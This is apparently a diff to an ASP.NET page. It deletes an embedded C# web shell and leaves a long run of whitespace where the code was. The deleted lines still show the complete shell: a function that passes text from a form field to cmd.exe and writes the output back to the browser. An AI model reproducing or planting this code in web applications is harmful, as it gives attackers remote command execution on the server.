@@ -2,28 +2,7 @@
 <%@ Import Namespace="System.Diagnostics" %>
 <%@ Import Namespace="System.IO" %>
 <script Language="c#" runat="server">
-void Page_Load(object sender, EventArgs e)
-{
-}
-string ExcuteCmd(string arg)
-{
-ProcessStartInfo psi = new ProcessStartInfo();
-psi.FileName = "cmd.exe";
-psi.Arguments = "/c "+arg;
-psi.RedirectStandardOutput = true;
-psi.UseShellExecute = false;
-Process p = Process.Start(psi);
-StreamReader stmrdr = p.StandardOutput;
-string s = stmrdr.ReadToEnd();
-stmrdr.Close();
-return s;
-}
-void cmdExe_Click(object sender, System.EventArgs e)
-{
-Response.Write("<pre>");
-Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
-Response.Write("</pre>");
-}
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
 </script>
 <HTML>
 <HEAD>
